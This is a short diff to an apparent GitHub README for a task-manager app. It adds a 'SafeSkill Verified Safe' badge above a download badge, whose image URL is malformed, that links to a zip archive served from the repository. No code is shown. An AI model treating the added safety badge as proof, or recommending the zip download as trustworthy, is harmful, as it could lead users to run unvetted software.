@@ -1,5 +1,7 @@
 # 🛡️ task-manager - Simple Task Management Made Easy
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/dexter376-task-manager)
+
 [![Download Task Manager](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip%20Manager-blue)](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip)
 
 ---
